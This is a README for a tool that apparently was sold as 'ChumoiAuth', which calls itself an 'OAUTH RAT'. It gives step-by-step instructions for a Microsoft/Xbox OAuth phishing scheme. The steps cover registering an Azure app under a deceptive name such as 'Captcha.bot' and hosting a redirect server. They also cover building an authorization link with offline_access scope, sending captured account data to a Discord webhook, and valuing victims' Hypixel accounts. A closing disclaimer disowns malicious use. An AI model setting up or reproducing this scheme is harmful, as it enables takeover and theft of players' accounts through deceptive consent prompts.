# ChumoiAuth
OAUTH RAT

TY FOR BUY

# Setup

any extra support dm ce ChumoiAuth#3755

## Config
First, you need to set a discord webhook in the "config.json" file 
Next, set a Hypixel api key in the config as well, if you want one, dm me on discord or get on an account into hypixel and do /api new.

at this point, it should look something like this:
```json
{
    "networth": {
        "apiKey": "9f96947b-82ce-4337-9667f-7d4fd7bbi35473"
    },
    "URLS": {
        "redirect_uri": "",
        "apiURL": ""
    },
    "webhook": {
        "webhookURL": "https://discord.com/api/webhooks/xxxxx"
    },
    "discord": {
        "bot_token": ""
    },
    "azure" : {
        "client_id": "",
        "client_secret": "",
        "redirect_uri": ""
    }
}
```

## Installing Requirements
[NodeJS](https://nodejs.org/download)
```js
npm install axios
npm install skyhelper-networth
npm install body-parser
npm install express
npm install iplim
```
[Python](https://python.org/download)
```python
pip install py-cord
```

## Azure App Registration Part 1
*Contrary to popular belief, this is actually very easy!*

First, visit [Microsoft Azure's](https://portal.azure.com/#create/hub) website. <sub>create an acc</sub>

Next, at the search top bar, search for "App registrations"

Then, click "New registration" in the top left corner

Next, type any name you want. To make it believable, you can choose something like "Captcha.bot" or "ChumoiAuth"

Now, we'll come back to this later.

## Hosting
If you want to host it on a vps, you can use DigitalOcean and get a free 200$ of credit for 2 months for only paying 5$

You can also use [OnRender](https://onrender.com/), it's free and just like heroku but with super slow upload times but it works perfectly fine
Vercel works too. I personally have mine hosting by ImagineHaxing on his vps.
Once you have your OnRender link, go back to App Registration.

## Azure App Registration Part 2
Now, set the redirect uri to your onrender link or your vps if it applies to you. Then set the platform to web.

Reopen config.json and set the client_id to the Application (client) ID on the Azure page.

Then, back on Azure, click "Add a certificate or secret" under Client credentials.

Click "New client secret", the name can be anything you want. It doesn't matter.

Then, click add and copy the Secret ID and set that to client_secret in the config. 

Set the redirect uri you put to the azure as redirect_uri in config

# Server Setup

## oAuth URL
Your URL should look like this:

```https://login.live.com/oauth20_authorize.srf?client_id=your_client_id&response_type=code&redirect_uri=your_redirect_url&scope=XboxLive.signin+offline_access&state=OK```

## (Optional): Discord Server Setup Bot

Make a discord bot and set the token as bot token in config.json

Start the bot and do `/setup <oauth link>` and watch it set up the server for you! 

# That's all! Enjoy ChumoiAuth :)

Please note that this is made for the sole purpose of showing how easy it is to do this.
I am not responsible for any malicious use of my code and do not condone it either.
Remember that the spread of malware is illegal and can get you time in prison. Please use my program responsibly.
